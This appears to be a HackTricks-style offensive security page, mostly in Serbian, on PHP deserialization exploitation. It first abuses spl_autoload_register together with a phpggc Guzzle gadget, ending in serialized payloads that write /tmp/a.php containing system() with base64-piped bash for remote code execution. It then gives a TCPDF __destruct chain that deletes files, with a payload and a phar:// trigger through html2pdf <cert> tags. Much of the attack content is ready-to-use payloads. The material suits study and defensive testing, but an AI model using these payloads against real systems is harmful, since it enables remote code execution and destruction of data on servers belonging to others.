# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Prvo, trebalo bi da proverite šta su [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Našli smo se u situaciji gde smo otkrili **PHP deserialization u webapp** koja nema biblioteku ranjivu na gadgets unutar **`phpggc`**. Međutim, u istom kontejneru postojao je **drugi composer webapp sa ranjivim bibliotekama**. Stoga je cilj bio da se **učita composer loader drugog webapp** i iskoristi da se **učita gadget koji će iskoristiti tu biblioteku sa gadgetom** iz webapp ranjivog na deserialization.

Steps:

- You have found a **deserialization** and there **isn’t any gadget** in the current app code
- You can abuse a **`spl_autoload_register`** function like the following to **load any local file with `.php` extension**
- For that you use a deserialization where the name of the class is going to be inside **`$name`**. You **cannot use "/" or "."** in a class name in a serialized object, but the **code** is **replacing** the **underscores** ("\_") **for slashes** ("/"). So a class name such as `tmp_passwd` will be transformed into `/tmp/passwd.php` and the code will try to load it.\
A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> Ako imate mogućnost **upload-a fajla** i možete otpremiti fajl sa **`.php` ekstenzijom**, možete **direktno zloupotrebiti tu funkcionalnost** i odmah dobiti RCE.

U mom slučaju, nisam imao ništa takvo, ali je unutar **istog kontejnera** postojala druga web aplikacija zasnovana na composer-u sa **bibliotekom ranjivom na `phpggc` gadget**.

- Da biste učitali tu drugu biblioteku, prvo treba da **učitate composer loader te druge web aplikacije** (jer loader trenutne aplikacije **neće pristupiti bibliotekama druge aplikacije**). **Znajući putanju aplikacije**, ovo možete vrlo lako postići sa: **`O:28:"www_frontend_vendor_autoload":0:{}`** (U mom slučaju, composer loader je bio u `/www/frontend/vendor/autoload.php`)
- Sada možete **učitati** loader druge aplikacije, pa je vreme da **`generate the phpgcc`** **payload** koji ćete koristiti. U mom slučaju sam koristio **`Guzzle/FW1`**, što mi je omogućilo da **zapišem bilo koji fajl unutar filesystem-a**.
- NOTE: Generisani gadget nije radio; da bi radio, **izmenio** sam taj payload **`chain.php`** iz phpggc i postavio **sva atributa** klasa sa **private** na **public**. Ako to ne uradite, nakon deserializacije stringa, atributi napravljenih objekata nemaju vrednosti.
- Sada imamo način da **učitamo loader druge aplikacije** i imamo **phpggc payload koji radi**, ali treba da **uradimo ovo u ISTOM ZAHTEVU** da bi loader bio učitan kada se gadget iskoristi. Za to sam poslao serializovani niz sa oba objekta kao:
- Možete videti **prvo loader kako se učitava, a zatim payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Sada možemo **napraviti i zapisati fajl**, međutim korisnik **nije mogao da piše u nijedan direktorijum unutar web servera**. Kao što možete videti u payload-u, PHP koji poziva **`system`** sa nekim **base64** je kreiran u **`/tmp/a.php`**. Zatim možemo **ponovo iskoristiti prvi tip payload** koji smo koristili kao LFI da učitamo composer loader drugog webapp-a **da bismo učitali generisani `/tmp/a.php`** fajl. Samo ga dodajte u deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Sažetak payload-a**

- **Učitaj composer autoload** drugog webapp-a u istom containeru
- **Učitaj phpggc gadget** da zloupotrebiš biblioteku iz drugog webapp-a (inicijalni webapp ranjiv na deserializaciju nije imao nijedan gadget u svojim bibliotekama)
- Gadget će **kreirati fajl sa PHP payload-om** u /tmp/a.php sa malicioznim komandama (webapp user ne može pisati ni u jedan folder bilo kog webapp-a)
- Završni deo našeg payload-a će koristiti **učitavanje generisanog php fajla** koji će izvršavati komande

Morao sam da **pozovem ovu deserializaciju dva puta**. U mojim testovima, prvi put je fajl `/tmp/a.php` bio kreiran, ali nije učitan, a drugi put je pravilno učitan.

## TCPDF `__destruct` POP chain za proizvoljno brisanje fajlova

Kada se instanca `TCPDF` stvarno pokupi od strane garbage collector-a, ona poziva `_destroy(true)`, iterira preko `$this->imagekeys`, i poziva `unlink()` za sve što izgleda kao cache fajl pod `K_PATH_CACHE`. Ako aplikacija izvršava `unserialize($user_data)` dok je klasa `TCPDF` učitana (npr. očekuje niz sa `html` ključem), možete dostaviti serijalizovani objekat koji postavlja:

- `file_id` na bilo koji integer koji nije prisutan u `self::$cleaned_ids` (npr. `-1`).
- `imagekeys` na putanje koje počinju sa `K_PATH_CACHE` ili koje se mogu učiniti da izgledaju tako (npr. `/tmp/../tmp/do_not_delete_this_file.txt` kada je `K_PATH_CACHE` `/tmp/`).

Primer payload-a koji pogađa nesiguran `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` tok:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Fajl se briše čim objekat izađe iz opsega. TCPDF 6.9.3 je pooštrio proveru tako da uklanja samo putanje sa prefiksom `__tcpdf_<file_id>_` unutar `K_PATH_CACHE` i uveo `_unlink()` da blokira non-`file://` schemes, pa su starije `Producer` verzije idealne mete.

### Pokretanje gadgeta putem `phar://` u html2pdf `<cert>` tagovima

spipu/html2pdf (≤5.3.0) umotava TCPDF i izlaže prilagođeni `<cert>` blok čija su `src`/`privkey` atributa validirana običnim `file_exists()`. Na PHP < 8.0 svaka filesystem funkcija koja dodirne `phar://` URL izaziva da se Phar metadata unserializuje. Ako zlonamerni TCPDF objekat iznad smestite u Phar arhivu, dobijate pouzdan POP čak i ako aplikacija sama nikada ne poziva `unserialize()`.

1. Napravite Phar sa `phar.readonly=0`, podesite stub/manifest da izgleda kao slika (npr. preimenujte `archive.phar` u `archive.png`), i smestite serializovani TCPDF objekat u Phar metadata.
2. Otpremite/postavite fajl na mesto dostupno aplikaciji, npr. `/tmp/user_files/user_1/archive.png`.
3. Pošaljite HTML koji sadrži CERT tag tako da html2pdf razreši putanju pod kontrolom napadača:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Poziv `file_exists()` deserializuje metapodatke, instancira TCPDF, a njegov destruktor briše izabranu datoteku, pretvarajući html2pdf u moćnu `phar://` ulaznu tačku. Verzija 5.3.1 je dodala `Security::checkValidPath()` da bi blokirala neodobrene sheme, pa su nasleđena okruženja i dalje atraktivna.

## References

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
